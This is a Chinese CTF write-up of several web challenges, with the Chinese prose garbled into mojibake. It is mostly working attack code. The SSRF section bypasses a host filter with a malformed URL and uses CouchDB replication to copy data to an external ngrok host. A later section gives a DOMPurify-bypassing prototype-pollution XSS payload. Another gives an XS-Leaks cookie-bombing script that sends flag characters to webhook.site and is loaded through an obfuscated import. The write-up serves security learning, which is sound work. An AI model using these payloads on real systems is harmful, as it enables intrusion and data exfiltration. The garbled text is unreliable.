Main.db.createUser(username, password); Main.db.addUserToDatabase(username, username); JSONObject flagDoc = new JSONObject(); flagDoc.put(\u0026#34;flag\u0026#34;, Main.flag); Main.db.insertDocumentToDatabase(username, flagDoc.toString()); ctx.result(\u0026#34;success\u0026#34;); } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } } å½“å‘å‡ºä¸€ä¸ªè¯·æ±‚ å¸¦ç€usernameå’Œpasswdæ—¶ï¼Œå®ƒä¼šè°ƒç”¨createUser()åˆ›å»ºä¸€æ¡ç”¨æˆ·çš„æ•°æ®å­˜å…¥åº“ä¸­ï¼Œå¹¶ä¸”å­˜ä¸€ä¸ªflagDocï¼›æ¥ç€çœ‹æœ€åä¸€ä¸ªtestAPI\npublic static void testAPI(Context ctx) { String url = (String)ctx.queryParam(\u0026#34;url\u0026#34;, String.class).get(); String method = (String)ctx.queryParam(\u0026#34;method\u0026#34;, String.class).get(); String data = ctx.queryParam(\u0026#34;data\u0026#34;); try { URL urlURI = new URL(url); if (urlURI.getHost().contains(\u0026#34;couchdb\u0026#34;)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } catch (MalformedURLException e) { throw new BadRequestResponse(\u0026#34;Input URL is malformed\u0026#34;); } try { if (method.equals(\u0026#34;GET\u0026#34;)) { JSONObject jsonObj = HttpClient.getAPI(url); String str = jsonObj.toString(); } else if (method.equals(\u0026#34;POST\u0026#34;)) { JSONObject jsonObj = HttpClient.postAPI(url, data); String stringJsonObj = jsonObj.toString(); if (Utils.containsFlag(stringJsonObj)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } else { throw new BadRequestResponse(\u0026#34;Request method is not accepted\u0026#34;); } } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } ctx.result(\u0026#34;success\u0026#34;); } å¯¹ç»™å‡ºçš„urlï¼ˆé€šè¿‡urlå‚æ•°è¿›è¡Œæäº¤ï¼‰è¿›è¡Œgetæˆ–è€…postï¼Œå…ˆæ£€æŸ¥if (urlURI.getHost().contains(\u0026quot;couchdb\u0026quot;))ï¼Œå¦‚æœä¸ºçœŸç›´æ¥æŠ¥é”™ï¼›ä¹‹åå‘å‡ºè¯·æ±‚ å¦‚æœUtils.containsFlag(stringJsonObj)ä¸ºçœŸä¹Ÿä¼šæŠ¥é”™å‡ºå»\næºç ç®—æ˜¯çœ‹å®Œäº†ï¼Œæ¥ä¸‹æ¥æƒ³æƒ³è§£é¢˜çš„æ–¹æ³•ï¼ˆæœ‰éƒ¨åˆ†å…³äºssrfçš„å‰ç½®çŸ¥è¯†å¯ä»¥çœ‹è¿™ç¯‡é¼»ç¥–ppt - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ğŸŠOrange Tsaiï¼‰\næœ¬åœ°å…ˆèµ·ä¸€ä¸ªç¯å¢ƒï¼Œrun on localhost:8080ï¼Œ\n$ curl localhost:8080/testAPI?url=https://couchdb:5984/\\\u0026amp;method=GET Illegal! ç”±ä¹‹å‰çš„ä»£ç åˆ†ææˆ‘ä»¬çŸ¥é“å› ä¸ºcouchdbçš„å­˜åœ¨æ‰€ä»¥illegalï¼Œä½†æ˜¯ä¸å¤ªé‡è¦ï¼ˆåæ­£ç»ˆä¼šè¢«ç»•è¿‡ï¼‰å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·\n$ curl http://localhost:8080/createUser?username=neptunian\\\u0026amp;password=neptunian # Creating user success $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq # Listing \u0026#34;neptunian\u0026#34; database documents, using our credentials (jq formats our JSON output) { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } } ] } $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq # Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{fake}\u0026#34; } æ˜¾ç„¶å½“æˆ‘ä»¬æ–°å»ºä¸€ä¸ªç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬çš„fake flagä¼šè¢«è‡ªåŠ¨æ’å…¥è¿™ä¸ªæ•°æ®åº“ä¸­ï¼Œå¹¶ä¸”ç›´æ¥curlæ˜¯å¯ä»¥å–å‡ºæ¥çš„ï¼Œä½†æ˜¯é¢˜ç›®æ˜¯ä¸èƒ½ç›´æ¥curl éœ€è¦ç¼åˆåˆ°é™å®šçš„testAPIä¸Šï¼Œå°è¯•æ„é€ ä¸€ä¸‹~\n$ curl -vv http://localhost:8080/testAPI?method=GET\\\u0026amp;url=http://neptunian:neptunian\\@couchdb\\:5984\\@couchdb\\:5984/neptunian ... success è¿™æ ·æ„é€ çš„urlå¹¶ä¸ä¼šè§¦å‘filterï¼Œä½†æ˜¯ç”±äºä»…ä»…è¿”å›successè€Œæ²¡æœ‰æ›´å¤šçš„ä¿¡æ¯ï¼Œä¸ºäº†éªŒè¯æ˜¯ä¸æ˜¯è§¦åŠåˆ°äº†couchdb serverï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ’å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„docï¼Œè¿™é‡Œç”¨pyè„šæœ¬ä¼ \nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # Simple POST Test params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; }) ) ) # Local response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 2, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } }, { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34; } } ] } # There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09! $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34;, \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; } è¶³ä»¥è¯æ˜æˆ‘ä»¬è‡ªå·±æ„é€ çš„å¸¦testAPIçš„ç¼åˆæ€ªæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œcouchdbç›¸å…³çš„å¢åˆ æŸ¥æ”¹åŠŸèƒ½çš„\nè€Œé‡è¦çš„æ˜¯è¿œç¨‹ä¹Ÿèƒ½æ‰“é€šï¼Œè¿™é‡Œæœ‰è¿™ä¹ˆä¸ªå¥½ä¸œè¥¿https://docs.couchdb.org/en/3.1.1/replication/replicator.htmlï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ç»„postæ•°æ®å°±å¯ä»¥è¿œç¨‹å¾—åˆ°ä¸€ä»½æ•°æ®ï¼\n{ \u0026#34;source\u0026#34;: \u0026#34;source_db_name\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;http://dest_user:dest_password@destination_host/dest_database\u0026#34; } è‡³äºåšæ³•å°±å¾ˆç®€å•äº†ï¼šå…ˆç”¨ngrokæä¸€ä¸ªç½‘ä¸Šå¯è®¿é—®çš„couchdbï¼Œå¾—åˆ°ä¸´æ—¶çš„url https://2d0a4710580a.ngrok.ioï¼Œå…ˆåˆ›å»ºæ•°æ®åº“æ¥ä¾¿äºæ¥æ”¶ä¹‹åå¤åˆ¶çš„æ•°æ®\n$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag {\u0026#34;ok\u0026#34;:true} ç„¶åå°±å¯ä»¥åˆ©ç”¨replicatorå’Œç²¾å¿ƒæ„é€ çš„jsonæ•°æ®å¤§æç‰¹æäº†ï¼å…ˆæœ¬åœ°\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # POST Replication params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;source\u0026#34;: \u0026#34;neptunian\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag\u0026#34; }) ) ) # response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) response = requests.get(\u0026#39;https://requester.mc.ax/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34; } } ] } $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq { \u0026#34;_id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\u0026#34; } å¥½è€¶ï¼å¤åˆ¶æ€ªå¥½è€¶ï¼\nè™½ç„¶ä¸Šé¢è¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®æ ¸å¿ƒæ€è·¯ä¹ŸæŒºæ¸…æ™°çš„ï¼Œå°±æ˜¯å…ˆè®¤çœŸåˆ†ææºç  æ‰¾å‡ºæ¼æ´ç‚¹æ˜¯ç”¨couchdbåˆ›å»ºç”¨æˆ·æ—¶ä¼šè‡ªåŠ¨æ’å…¥flag è¿™ä¸ªè¿‡ç¨‹æ˜¯ä½¿ç”¨httpè¯·æ±‚ æˆ‘ä»¬å¾ˆå®¹æ˜“å°±å¯ä»¥æ„é€ ä¸€ä¸ªurlåˆ›å»ºç”¨æˆ· è®©flagè¿›å…¥è‡ªå·±æŒæ§çš„æ•°æ®åº“ä¸­ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„è¿›è¡Œæ•°æ®åº“çš„å¢åˆ æŸ¥æ”¹ï¼›ä½†æ˜¯è¿™è¿˜éœ€è¦æ¥ä¸Šé¢˜ç›®ä¸­ç»™å‡ºçš„testAPIå…¥å£æ‰è¡Œï¼Œåˆç»è¿‡ä¸€äº›æ„é€ å¯ä»¥æˆåŠŸç¼åˆï¼›ä½†æ˜¯ç”±äºé¸¡è´¼çš„è®¾ç½® testAPIå¤„çš„è¯·æ±‚åªä¼šè¿”å›æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸ºäº†ç¡®åˆ‡çš„å¾—åˆ°flagï¼Œæˆ‘ä»¬åˆ©ç”¨äº†couchdbçš„_replicatorè¿™ä¸ªå¥½ä¸œè¥¿æ¥è¿›è¡Œä¸€ä¸ªæ•°æ®çš„å¤åˆ¶ï¼Œå¾—åˆ°flag~~~\nâ€”â€”â€”â€”ä»¥ä¸‹æ˜¯ç¬¬äºŒç§è§£æ³•: char-by-char-blind-sqli\næºç çš„åˆ†æä¸å˜ï¼Œè¿™æ˜¯æ ¹æœ¬ï¼Œå·®å¼‚ä¹‹å¤„é¦–å…ˆåœ¨äºæ„é€ urlæ—¶è¿™é‡Œåˆ©ç”¨äº†couchdbçš„å¦ä¸€ä¸ªå¥½ä¸œè¥¿_find\ncurl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \u0026#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find\u0026#39; --data \u0026#39;{\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;.*\u0026#34;}}}\u0026#39; æœ¬åœ°æµ‹è¯•å¯ä»¥æˆåŠŸä¼šæ˜¾å‡ºflagï¼›ç¬¬äºŒä¸ªå·®å¼‚åœ¨ç¼åˆtestAPIçš„æ—¶å€™ï¼Œç”±äºfilterå¯¹äºå¤§å°å†™ä¸å¤ªæ•æ„Ÿï¼Œæ‰€ä»¥å¤§å†™Couchæ¥ç»•è¿‡äº†ï¼›åŒæ ·é¢ä¸´å›æ˜¾åªæœ‰æˆåŠŸæˆ–å¤±è´¥ ä½†æ˜¯char-by-char-blind-sqliæ— æ‰€ç•æƒ§~\nimport urllib.parse import requests import json import string # first, make a request to # /createUser?username=strellicsquad\u0026amp;password=12345 alphabet = \u0026#34;etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ\u0026#34; def test_regex(regex): url = \u0026#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find\u0026#34; data = json.dumps({\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: regex}}}) r = requests.get(f\u0026#34;https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}\u0026amp;method=POST\u0026amp;data={urllib.parse.quote(data)}\u0026#34;) return \u0026#34;Something went wrong\u0026#34; in r.text flag = \u0026#34;flag{\u0026#34; while not flag.endswith(\u0026#34;}\u0026#34;): for c in alphabet: check = \u0026#34;^\u0026#34; + flag + c + \u0026#34;.*\u0026#34; if test_regex(check): print(f\u0026#34;found {c}-\u0026gt; {flag}{c}\u0026#34;) flag += c break ä¹Ÿå¯ä»¥æ‹¿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\nâ€”â€”â€”â€”æœ€æ‚²å‚¬çš„è«è¿‡äºä¹‹åæˆ‘ä¹Ÿç”¨dockeråœ¨æœ¬åœ°èµ·äº†ä¸€ä¸ªç¯å¢ƒ ä½†æ˜¯åˆå§‹åŒ–æœ‰é—®é¢˜ï¼Œå¯¼è‡´localhost:5984æ— æ³•è®¿é—®\næˆ‘æœäº†ä¸€ä¸‹ æœ‰ç›¸å…³é—®é¢˜çš„è§£ç­” ä½†éƒ½ä¸æ˜ç¡®â€¦â€¦\nä»è¿™ä¸ªæŠ¥é”™çœ‹ åº”è¯¥æ˜¯è¯´é¢˜ç›®ç›¸å…³çš„éœ€è¦çš„database_does_not_existï¼Œä½†æ˜¯ç”¨äºåˆå§‹åŒ–çš„/_utilsä¹Ÿæ— æ³•è®¿é—®ï¼Œç›´æ¥curl 127.0.0.1:5984ä¹Ÿæ˜¯å¤±è´¥ï¼Œcurl couchdb:5984ä¹Ÿæ˜¯å¤±è´¥ï¼Œå¤„ç†æŠ¥é”™çœŸæ˜¯å¿ƒç´¯\nweb/requester-strikes-back  Java was found to not be the future. Can you take down requester again?\n æºç å¤„æœ‰ä¸€å¤„ä¿®æ”¹if (urlURI.getHost().toLowerCase().contains(\u0026quot;couchdb\u0026quot;))\nè¿™ä½¿å¾—æˆ‘ä»¬ä¸èƒ½ç”¨ä¹‹å‰çš„Couchdbå¤§å†™çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œä½†æ˜¯\nç»“åˆIncorrect handling of malformed authority component by URIUtils#extractHost\næˆ‘ä»¬åªéœ€è¦æŠŠä¹‹å‰çš„urlæ”¹æˆhttp://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_findå³å¯ï¼ˆè§£æ³•äºŒï¼‰\nè§£æ³•ä¸€ç›´æ¥è·‘å°±è¡Œ ä¸€æ ·èƒ½é€š\nç›¸å…³çš„ä¸€äº›ssrfå‰ç½®çŸ¥è¯†\u0026amp;urlè§£æé—®é¢˜ä»ç„¶å¯ä»¥çœ‹è¿™é‡Œï¼šA New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ğŸŠOrange Tsaiï¼ˆå¥½å‰å®³çš„pptï¼‰\nå‚è€ƒï¼šwp1 wp2\nweb/pastebin-1  Ah, the classic pastebin.\npastebin-1.mc.ax\nAdmin bot\nDownloads - main.rs\n pastebinï¼Œç±»ä¼¼ç•™è¨€æ¿çš„æ ·å­ å¯ä»¥å‘è¡¨paste\nç¬¬ä¸€ååº”å°±æ˜¯xssï¼Œè¯•ä¸€ä¸‹alert(1) æˆåŠŸå¼¹çª—é¢˜ç›®å¦å¤–æä¾›äº†ä¸€ä¸ª/admin-boté¡µé¢ï¼Œè¿™ä¸ªï¼Œå¦¥å¦¥çš„xsså¥½å§ ç›´æ¥xss platformä¸€æŠŠæ¢­ï¼\n***web/pastebin-2-social-edition  Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.\npastebin-2-social-edition.mc.ax\nAdmin bot\n è¿™æ¬¡adminbotä¼šç»™è‡ªå·±çš„pasteä¸‹é¢ç•™è¨€å›å¤\næ˜¾ç„¶å•Š è¿˜æ˜¯xssï¼Œä½†æ˜¯ç”¨äº†DOMPurifyï¼Œå¹¶ä¸”è¿™ä¸ªç‰ˆæœ¬ä¹Ÿå¾ˆæ–° ä¹‹å‰çš„ä¸€äº›bugä¹Ÿæ²¡æ³•åˆ©ç”¨ï¼Œå‚è€ƒwp\nçœ‹æºç \næ³¨æ„åˆ°è¿™é‡Œï¼Œå¦‚æœæœ‰é”™è¯¯ å°±ä¼šè®¾ç½®errorContainer.innerHTML = message;ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶error message å°±èƒ½åšåˆ°xssäº†ï¼›è¿™é‡Œåˆ©ç”¨åŸå‹æ±¡æŸ“prototype pollutionï¼Œå³ä½¿DOMPurifyå¯ä»¥é˜»æŒ¡ä¸€äº›xsså¸¸ç”¨çš„æ ‡ç­¾æˆ–è€…å±æ€§ï¼Œä¹Ÿé˜»æ­¢ä¸äº†åŸå‹æ±¡æŸ“\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; æˆ‘ä»¬å¯ä»¥æŠŠerroræ±¡æŸ“æˆä»»æ„å€¼ï¼Œmessageæ±¡æŸ“ä¸ºxsså†…å®¹å’Œpayload\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;error\u0026#34;] = \u0026#34;1\u0026#34;; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;message\u0026#34;] = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;; å½“è¯·æ±‚è¢«è§¦å‘æ—¶ï¼Œerrorå’Œmessageå°±éƒ½æ˜¯æˆ‘ä»¬è‡ªå®šçš„å€¼äº†ï¼›è™½ç„¶DOMPurifyä¼šå¯¹__proto__è¿›è¡Œç§»é™¤ï¼Œä½†æ˜¯å› ä¸ºä¸Šé¢const fieldsetName = decodeURIComponent(fieldset.name);ï¼Œæ‰€ä»¥å†å¯¹__proto__æ¥ä¸€æ‰‹urlencodeå°±èƒ½ç»•è¿‡äº†\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;%255F_proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; ***web/pastebin-3  Boy, there sure are a lot of pastebins. Gotta think of new themes\u0026hellip;\nPlease put a reasonably secure password when making an account\n è¿˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é¡µé¢ create pasteï¼Œå¢åŠ äº†ä¸€ä¸ªæœç´¢çš„åŠŸèƒ½\nå…ˆçœ‹/viewè·¯ç”±\næˆ‘ä»¬çš„ä¾¿ç­¾ æ€»ä½“ä¼šä»¥ä¸€ä¸ªurlçš„å½¢å¼æ”¾å…¥iframeä¸­ï¼Œæ¥ç€å»çœ‹çœ‹sanbox_urlçš„æ¸²æŸ“æƒ…å†µ\nè€Œäº®ç‚¹æ˜¯ï¼Œæˆ‘ä»¬çš„pasteåˆè¢«ç›´æ¥æ”¾å…¥åå¼•å·ä¸­é—´äº†ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ç±»ä¼¼${alert(1)}çš„ä¸œè¥¿ç›´æ¥å°±å¯ä»¥è·‘jsäº†ï¼\nç°åœ¨æˆ‘ä»¬æœ‰äº†å¯ä»¥æ“ä½œjsä»£ç çš„åœ°æ–¹â€”â€”ä½†æ˜¯è¿™æ˜¯åœ¨sandboxä¸­ï¼Œä¸ä¸»é¡µé¢å¹¶ä¸æ˜¯åŒæºçš„ğŸ¤”\nå†çœ‹çœ‹æ–°åŠ å…¥çš„searchåŠŸèƒ½\nâ€”â€”â€”â€”è¿™é‡Œè¦å…ˆæ’æ’­ä¸€æ¡çŸ¥è¯†äº† XSLeaksï¼ˆæ›´å¤šçš„ç›¸å…³å‚è€ƒé“¾æ¥æ”¾åˆ°åé¢äº†ï¼‰ï¼Œä¸€ä¸ªå¸¸è§çš„xsleakæ”»å‡»è¯¦è§error events\nCross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the webâ€™s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. â€”â€”from XSLeaks wiki\n/searchä½¿ç”¨çš„æ˜¯flaskä¸­çš„flash()æ¶ˆæ¯é—ªç°æ¥å±•ç¤ºæœç´¢çš„ç»“æœï¼Œå®ƒä¼šå­˜å‚¨åœ¨session cookieä¸­ï¼Œå¦‚æœæ¶ˆæ¯æ¯”ä¼šè¯cookieå¤§çš„è¯ä¼šå¯¼è‡´æ¶ˆæ¯é—ªç°é™é»˜å¤±è´¥â€”â€”æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€æ¡ç‰¹æ€§ï¼Œç”¨é•¿é•¿çš„cookieï¼Œå¦‚æœè¯·æ±‚æˆåŠŸ é‚£ä¹ˆéœ€è¦æ˜¾ç¤ºflashæ—¶cookieå°†ä¼šè¶…è¿‡é™åˆ¶æŠ¥é”™ï¼Œè€Œè¯·æ±‚å¤±è´¥ å°±åªæœ‰No results foundçŸ­çŸ­çš„ä¸€æ¡ï¼Œä¸ä¼šæŠ¥400\næˆ‘ä»¬ç”¨XSLeaks wikiä¸Šç»™å‡ºçš„ probeError snippet\nfunction probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } è™½ç„¶åŒç«™çš„cookiesï¼ˆsame-site cookiesï¼‰é€šå¸¸ä¼šé˜»æ­¢è¿™ç§æƒ…å†µï¼Œä½†ç”±äºé¢˜ä¸­çš„sandboxæ˜¯å­åŸŸï¼Œå¹¶ä¸æ˜¯åŒç«™çš„æƒ…å†µï¼Œæ‰€ä»¥probeErrorå¯ä»¥æ£€æµ‹åˆ°ï¼Œä¸‹é¢æ˜¯è„šæœ¬\nconst alphabet = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; function set() { document.cookie = `a=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` document.cookie = `b=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` } function unset() { document.cookie = `a=; domain=.pastebin-3.mc.ax` document.cookie = `b=; domain=.pastebin-3.mc.ax` } function probeError(url) { return new Promise(resolve =\u0026gt; { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; resolve(false); script.onerror = () =\u0026gt; resolve(true); document.head.appendChild(script); }); } function wait(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } (async () =\u0026gt; { let prefix = \u0026#34;flag{c00k13_b0mb1n6_15_f4k3_vu\u0026#34;; set(); navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded\u0026#39;); while (!prefix.endsWith(\u0026#39;}\u0026#39;)) { for (let i = 0; i \u0026lt; alphabet.length; i++) { let attempt = prefix + alphabet[i]; let subwindow = window.open(\u0026#34;https://pastebin-3.mc.ax/search?query=\u0026#34; + encodeURIComponent(attempt)); await wait(500); subwindow.close(); if (await probeError(\u0026#34;https://pastebin-3.mc.ax/home\u0026#34;)) { navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?\u0026#39; + attempt); unset(); prefix = attempt; break; } } } })(); ä¸ºäº†å¼•å…¥è¿™ä¸ªè„šæœ¬ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªpaste\n${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)} å…¶ä»–å‡ ä¸ªç‰ˆæœ¬çš„è„šæœ¬ï¼šver2 ver3\nå‚è€ƒï¼šXSLeaks | Side Channel Vulnerabilities on the Web - Detection and Preventio | Flask æ¶ˆæ¯é—ªç°\nweb/wtjs  Ya like golf? How about JS golf?\nwtjs.mc.ax | Admin bot\nDownloads: wtjs.tar\n â€¦â€¦â€¦â€¦â€¦â€¦æœ‰å­—æ•°é™åˆ¶çš„fuckjsï¼Œæˆ‘ä¸ä¼šæ„é€  å¤ªç—›è‹¦äº†\nwpå‚è§ä¸€å¼ google sheet wp2\nä¸å¾—ä¸è¯´ï¼Œè¿™ä¸ªsheetçœŸçš„æ˜¯ç›¸å½“æ¸…æ™°äº†â€¦â€¦ç”¨9å¼ è¡¨ è¯¦ç»†çš„å†™äº†ä¸€ä¸‹åˆ°åº•æ˜¯æ€ä¹ˆæŠŠæœ€ç»ˆçš„payloadç»™æ‹¼å‡ºæ¥çš„ï¼ŒçœŸçš„æ˜¯ç°ä»£ç‰ˆæ´»å­—å°åˆ· ç»äº† æ•°å­—æ°‘å·¥æ˜¯å§ğŸ˜…\nå±å®æ˜¯èšŒåŸ ä½äº†ğŸ˜…\n***web/MdBin  Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologiesâ„¢, including React, this pastebin has you covered, with brand-new theming support!\nmdbin.mc.ax\nSubmit to the admin at admin-bot.mc.ax/mdbin; the flag is in a 